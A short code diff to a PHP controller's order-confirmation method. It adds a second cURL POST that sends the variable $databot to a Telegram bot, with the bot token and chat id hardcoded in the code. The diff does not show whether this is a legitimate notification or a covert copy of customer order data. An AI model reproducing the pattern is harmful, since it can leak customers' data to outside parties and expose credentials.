@@ -110,8 +110,26 @@ class HomeController extends Controller
         curl_setopt($curll, CURLOPT_POST, true);
         curl_setopt($curll, CURLOPT_POSTFIELDS, $senderr);
 
-        // Execute cURL request
         $response = curl_exec($curll);
+
+
+        $url_new = "https://api.telegram.org/bot7681900926:AAHjX9_z-lnINzH9b6crchJl0oE8ariSpLQ/sendMessage";
+        // Prepare the POST data
+        $senderr = [
+            'chat_id' => 892344151,
+            'text' => $databot,
+        ];
+        // DIE($databot);
+
+
+
+        // Initialize cURL
+        $curll_new = curl_init($url_new);
+        curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curll_new, CURLOPT_POST, true);
+        curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
+
+        $response = curl_exec($curll_new);
         return response()->json([
             'success' => true,
             'message' => 'Order confirmed successfully.',
